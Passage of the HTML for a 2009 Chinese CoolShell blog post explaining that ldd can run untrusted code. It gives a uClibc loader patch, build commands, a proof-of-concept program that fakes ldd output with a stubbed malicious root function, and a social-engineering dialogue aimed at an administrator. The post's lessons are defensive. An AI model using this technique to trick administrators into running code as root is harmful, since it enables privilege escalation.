+     <span id="more-1626">
+     </span>
+    </p>
+    <div class="ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction" id="ez-toc-container">
+     <div class="ez-toc-title-container">
+      <p class="ez-toc-title">
+       目录
+      </p>
+      <span class="ez-toc-title-toggle">
+      </span>
+     </div>
+     <nav>
+      <ul class="ez-toc-list ez-toc-list-level-1">
+       <li class="ez-toc-page-1 ez-toc-heading-level-4">
+        <a class="ez-toc-link ez-toc-heading-1" href="#%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F" title="具体发生了什么？">
+         具体发生了什么？
+        </a>
+       </li>
+       <li class="ez-toc-page-1 ez-toc-heading-level-4">
+        <a class="ez-toc-link ez-toc-heading-2" href="#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8" title="编译一个新的装载器">
+         编译一个新的装载器
+        </a>
+       </li>
+       <li class="ez-toc-page-1 ez-toc-heading-level-4">
+        <a class="ez-toc-link ez-toc-heading-3" href="#%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80" title="小试 牛刀">
+         小试 牛刀
+        </a>
+       </li>
+       <li class="ez-toc-page-1 ez-toc-heading-level-4">
+        <a class="ez-toc-link ez-toc-heading-4" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F" title="邪恶的程序">
+         邪恶的程序
+        </a>
+       </li>
+       <li class="ez-toc-page-1 ez-toc-heading-level-4">
+        <a class="ez-toc-link ez-toc-heading-5" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D" title="邪恶的电话">
+         邪恶的电话
+        </a>
+       </li>
+      </ul>
+     </nav>
+    </div>
+    <h4>
+     <span class="ez-toc-section" id="%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F">
+     </span>
+     具体发生了什么？
+     <span class="ez-toc-section-end">
+     </span>
+    </h4>
+    <p>
+     对于第二个和第三个命令来说，好像是对
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     的一个包装或是一个隐式调用。对于第二个和第三个命令来说，
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /bin/grep
+     </code>
+     这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     是一个C 程序)。
+    </p>
+    <p>
+     如果你使用的是Linux，那么，你可以去看看
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ld-linux.so
+     </code>
+     装载器是否可以被
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。
+    </p>
+    <p>
+     所以，如果我们可以让
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ld-linux.so
+     </code>
+     装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。
+    </p>
+    <p>
+     例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd /home/you/app/bin/exec
+     </code>
+     ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。
+    </p>
+    <h4>
+     <span class="ez-toc-section" id="%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8">
+     </span>
+     编译一个新的装载器
+     <span class="ez-toc-section-end">
+     </span>
+    </h4>
+    <p>
+     下载
+     <a href="http://www.uclibc.org/">
+      uClibc
+     </a>
+     C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">$ mkdir app
+$ cd app
+app$ wget 'http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2'</pre>
+    <p>
+     解压这个包，并执行
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      make menuconfig
+     </code>
+     ，选项你的平台架构（比如：i386），剩下的事情保持不变。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
+$ rm -rf uClibc-0.9.30.1.tar.bz2
+$ cd uClibc-0.9.30.1
+$ make menuconfig</pre>
+    <p>
+     编辑 .config 并设置目标安装目录：到
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      /home/you/app/uclibc
+     </code>
+     ，
+     <br/>
+     把下面两行
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">
+RUNTIME_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/"
+DEVEL_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/usr/"</pre>
+    <p>
+     改成
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">RUNTIME_PREFIX="/home/you/app/uclibc/"
+DEVEL_PREFIX="/home/you/app/uclibc/usr/"</pre>
+    <p>
+     现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldso/ldso/ldso.c
+     </code>
+     文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      patch -p0 &lt; file
+     </code>
+     。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     想列出动态链接库的文件列表。
+    </p>
+    <p>
+     [patch]
+     <br/>
+     — ldso/ldso/ldso-orig.c 2009-10-25 00:27:12.000000000 +0300
+     <br/>
+     +++ ldso/ldso/ldso.c 2009-10-25 00:27:22.000000000 +0300
+     <br/>
+     @@ -404,9 +404,11 @@
+     <br/>
+     } #endif
+     <br/>
+     + /*
+     <br/>
+     if (_dl_getenv("LD_TRACE_LOADED_OBJECTS", envp) != NULL) {
+     <br/>
+     trace_loaded_objects++;
+     <br/>
+     }
+     <br/>
+     + */
+     <br/>
+     #ifndef __LDSO_LDD_SUPPORT__
+     <br/>
+     if (trace_loaded_objects) {
+     <br/>
+     [/patch]
+    </p>
+    <p>
+     下面让我们来编译并安装它。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">$ make -j 4
+$ make install</pre>
+    <p>
+     于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。
+    </p>
+    <h4>
+     <span class="ez-toc-section" id="%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80">
+     </span>
+     小试 牛刀
+     <span class="ez-toc-section-end">
+     </span>
+    </h4>
+    <p>
+     首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      app/bin/
+     </code>
+     下，叫“myapp.c”，下面是源代码
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+  if (getenv("LD_TRACE_LOADED_OBJECTS")) {
+    printf("All your things are belong to me.\n");
+  }
+  else {
+    printf("Nothing.\n");
+  }
+  return 0;
+}</pre>
+    <p>
+     这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。
+    </p>
+    <p>
+     下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">$ L=/home/you/app/uclibc
+$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
+    -Wl,-rpath-link,$L/lib \
+    -nostdlib \
+    myapp.c -o myapp \
+    $L/usr/lib/crt*.o \
+    -L$L/usr/lib/ \
+    -lc</pre>
+    <p>
+     下面是GCC的各个参数的解释：
+    </p>
+    <ul>
+     <li>
+      <strong>
+       -Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0
+      </strong>
+      — 指定一个新的装载器。
+     </li>
+     <li>
+      <strong>
+       -Wl,-rpath-link,$L/lib
+      </strong>
+      — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。
+     </li>
+     <li>
+      <strong>
+       -nostdlib
+      </strong>
+      — 不使用系统标准库。
+     </li>
+     <li>
+      <strong>
+       myapp.c -o myapp
+      </strong>
+      — 编译myapp.c 成可执行文件 myapp,
+     </li>
+     <li>
+      <strong>
+       $L/usr/lib/crt*.o
+      </strong>
+      — 静态链接runtime 代码
+     </li>
+     <li>
+      <strong>
+       -L$L/usr/lib/
+      </strong>
+      — libc 的目录（静态链接）
+     </li>
+     <li>
+      <strong>
+       -lc
+      </strong>
+      —  C 库
+     </li>
+    </ul>
+    <p>
+     现在让我们来运行一下我们的
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      myapp
+     </code>
+     （没有ldd，一切正常）
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">app/bin$ ./myapp
+Nothing.</pre>
+    <p>
+     LD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。
+    </p>
+    <p>
+     现在，让我们来使用
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     来看看这个程序的最大的影响力，让我们以root身份来干这个事。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="shell">$ su
+Password:
+# ldd ./myapp
+All your things are belong to me.</pre>
+    <p>
+     哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！
+    </p>
+    <h4>
+     <span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F">
+     </span>
+     邪恶的程序
+     <span class="ez-toc-section-end">
+     </span>
+    </h4>
+    <p>
+     下面这个例子更为实际一些，如果没有
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     后，它会在干完坏事后，模仿正确的
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     的输出，告诉你
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      libat.so.0
+     </code>
+     不存在。
+    </p>
+    <p>
+     下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。
+    </p>
+    <pre class="EnlighterJSRAW" data-enlighter-language="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+/*
+This example pretends to have a fictitious library 'libat.so.0' missing.
+When someone with root permissions runs `ldd this_program`, it does
+something nasty in malicious() function.
+
+I haven't implemented anything malicious but have written down some ideas
+of what could be done.
+
+This is, of course, a joke program. To make it look more real, you'd have
+to bump its size, add some more dependencies, simulate trying to open the
+missing library, detect if ran under debugger or strace and do absolutely
+nothing suspicious, etc.
+*/
+
+void pretend_as_ldd()
+{
+    printf("\tlinux-gate.so.1 =&gt;  (0xffffe000)\n");
+    printf("\tlibat.so.0 =&gt; not found\n");
+    printf("\tlibc.so.6 =&gt; /lib/libc.so.6 (0xb7ec3000)\n");
+    printf("\t/lib/ld-linux.so.2 (0xb8017000)\n");
+}
+
+void malicious()
+{
+    if (geteuid() == 0) {
+        /* we are root ... */
+        printf("poof, all your box are belong to us\n");
+
+        /* silently add a new user to /etc/passwd, */
+        /* or create a suid=0 program that you can later execute, */
+        /* or do something really nasty */
+    }
+}
+
+int main(int argc, char **argv)
+{
+    if (getenv("LD_TRACE_LOADED_OBJECTS")) {
+        malicious();
+        pretend_as_ldd();
+        return 0;
+    }
+
+    printf("%s: error while loading shared libraries: libat.so.0: "
+           "cannot open shared object file: No such file or directory\n",
+           argv[0]);
+    return 127;
+}</pre>
+    <p>
+    </p>
+    <h4>
+     <span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D">
+     </span>
+     邪恶的电话
+     <span class="ez-toc-section-end">
+     </span>
+    </h4>
+    <p>
+     事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      ldd
+     </code>
+     去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。
+    </p>
+    <p>
+     系统管理员的电话狂响……
+    </p>
+    <p>
+     系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”
+    </p>
+    <p>
+     黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”
+    </p>
+    <p>
+     系统管理员：“没问题，你的那个程序在哪里？”
+    </p>
+    <p>
+     黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。
+    </p>
+    <p>
+     系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。
+    </p>
+    <p>
+     系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”
+    </p>
+    <p>
+     黑客说: “谢谢，应该没有别的嘛。”
+    </p>
+    <p>
+     系统管理员：“嗯，查到了，说是没有了
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      libat.so.0
+     </code>
+     这是你自己的动态链接库吗？”
+    </p>
+    <p>
+     黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：
+    </p>
+    <p style="padding-left: 30px;">
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      mv ~/.hidden/working_app ~/app/bin/myapp
+     </code>
+     <br/>
+     <code class="EnlighterJSRAW" data-enlighter-language="raw">
+      mv ~/.hidden/libat.so.o ~/app/bin/
+     </code>
+    </p>
+    <p>
+     黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”
+    </p>
+    <p>
+     系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）
+    </p>
+    <p>
+     <strong>
+      教训一：千万不要使用
+      <code class="EnlighterJSRAW" data-enlighter-language="raw">
+       ldd
+      </code>
+      去测试你不知道的文件！
+      <br/>
+      教训二：千万不要相信陌生人！
+     </strong>
+    </p>
+    <p>
+     文章：
+     <a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" target="_blank">
+      来源
+     </a>
+     （以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）
+    </p>
+    <div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+     <p align="center">
+      <strong>
+       （转载本站文章请注明作者和出处
+       <a href="https://coolshell.cn/">
+        酷 壳 – CoolShell
+       </a>
+       ，请勿用于任何商业用途）
+      </strong>
+     </p>
+    </div>
+    <div class="wp_rp_wrap wp_rp_vertical_m" id="wp_rp_first">
+     <div class="wp_rp_content">
+      <h3 class="related_post_title">
+       相关文章
+      </h3>
+      <ul class="related_post wp_rp">
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/22320.html">
+         <img alt="eBPF 介绍" height="150" src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/22320.html">
+         eBPF 介绍
+        </a>
+       </li>
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/19219.html">
+         <img alt="打造高效的工作环境 – Shell 篇" height="150" src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/19219.html">
+         打造高效的工作环境 – Shell 篇
+        </a>
+       </li>
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18654.html">
+         <img alt="记一次Kubernetes/Docker网络排障" height="150" src="https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/18654.html">
+         记一次Kubernetes/Docker网络排障
+        </a>
+       </li>
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18360.html">
+         <img alt="程序员练级攻略（2018)  与我的专栏" height="150" src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/18360.html">
+         程序员练级攻略（2018) 与我的专栏
+        </a>
+       </li>
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17998.html">
+         <img alt="Linux PID 1 和 Systemd" height="150" src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/17998.html">
+         Linux PID 1 和 Systemd
+        </a>
+       </li>
+       <li>
+        <a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17416.html">
+         <img alt="缓存更新的套路" height="150" src="https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png" width="150"/>
+        </a>
+        <a class="wp_rp_title" href="https://coolshell.cn/articles/17416.html">
+         缓存更新的套路
+        </a>
+       </li>
+      </ul>
+     </div>
+    </div>
+    <div class="post-ratings" data-nonce="86869e2d8c" id="post-ratings-1626" itemscope="" itemtype="https://schema.org/Article">
+     <img alt="好烂啊" id="rating_1626_1" onclick="rate_post();" onkeypress="rate_post();" onmouseout="ratings_off(3.3, 4, 0);" onmouseover="current_rating(1626, 1, '好烂啊');" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif" style="cursor: pointer; border: 0px;" title="好烂啊"/>
+     <img alt="有点差" id="rating_1626_2" onclick="rate_post();" onkeypress="rate_post();" onmouseout="ratings_off(3.3, 4, 0);" onmouseover="current_rating(1626, 2, '有点差');" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif" style="cursor: pointer; border: 0px;" title="有点差"/>
+     <img alt="凑合看看" id="rating_1626_3" onclick="rate_post();" onkeypress="rate_post();" onmouseout="ratings_off(3.3, 4, 0);" onmouseover="current_rating(1626, 3, '凑合看看');" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif" style="cursor: pointer; border: 0px;" title="凑合看看"/>
+     <img alt="还不错" id="rating_1626_4" onclick="rate_post();" onkeypress="rate_post();" onmouseout="ratings_off(3.3, 4, 0);" onmouseover="current_rating(1626, 4, '还不错');" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_half.gif" style="cursor: pointer; border: 0px;" title="还不错"/>
+     <img alt="很精彩" id="rating_1626_5" onclick="rate_post();" onkeypress="rate_post();" onmouseout="ratings_off(3.3, 4, 0);" onmouseover="current_rating(1626, 5, '很精彩');" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_off.gif" style="cursor: pointer; border: 0px;" title="很精彩"/>
+     (
+     <strong>
+      12
+     </strong>
+     人打了分，平均分：
+     <strong>
+      3.25
+     </strong>
+     )
+     <br/>
+     <span class="post-ratings-text" id="ratings_1626_text">
+     </span>
+     <meta content="ldd 的一个安全问题" itemprop="name"/>
+     <meta content="ldd 的一个安全问题" itemprop="headline"/>
+     <meta content="我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。
+
+首先，我们先来了解一下，我们怎么来使..." itemprop="description"/>
+     <meta content="2009-10-28T00:15:46+08:00" itemprop="datePublished"/>
+     <meta content="2009-10-28T11:23:07+08:00" itemprop="dateModified"/>
+     <meta content="https://coolshell.cn/articles/1626.html" itemprop="url"/>
+     <meta content="陈皓" itemprop="author"/>
+     <meta content="https://coolshell.cn/articles/1626.html" itemprop="mainEntityOfPage"/>
+     <div itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization" style="display: none;">
+      <meta content="酷 壳 - CoolShell" itemprop="name"/>
+      <meta content="https://coolshell.cn" itemprop="url"/>
+      <div itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
+       <meta content="" itemprop="url"/>
+      </div>
+     </div>
+     <div itemprop="aggregateRating" itemscope="" itemtype="https://schema.org/AggregateRating" style="display: none;">
+      <meta content="5" itemprop="bestRating"/>
+      <meta content="1" itemprop="worstRating"/>
+      <meta content="3.25" itemprop="ratingValue"/>
+      <meta content="12" itemprop="ratingCount"/>
+     </div>
+    </div>
+    <div class="post-ratings-loading" id="post-ratings-1626-loading">
+     <img class="post-ratings-image" height="16" src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif" width="16"/>
+     Loading...
+    </div>
+   </div>
+   <footer class="entry-footer">
+    <hr/>
+    <div class="row">
+     <div class="col-md-6 cattegories">
+      <span class="cat-links">
+       <i class="fa fa-folder-open">
+       </i>
+       <a href="https://coolshell.cn/category/operatingsystem/unixlinux" rel="category tag">
+        Unix/Linux
+       </a>
+       ,
+       <a href="https://coolshell.cn/category/tools" rel="category tag">
+        编程工具
+       </a>
+       ,
+       <a href="https://coolshell.cn/category/netsecurity" rel="category tag">
+        网络安全
+       </a>
+      </span>
+     </div>
+     <div class="col-md-6 tags">
+      <span class="tags-links">
+       <i class="fa fa-tags">
+       </i>
+       <a href="https://coolshell.cn/tag/ldd" rel="tag">
+        ldd
+       </a>
+       ,
+       <a href="https://coolshell.cn/tag/linux" rel="tag">
+        Linux
+       </a>
+      </span>
+     </div>
+    </div>
+   </footer>
+  </article>
+ </body>
+</html>
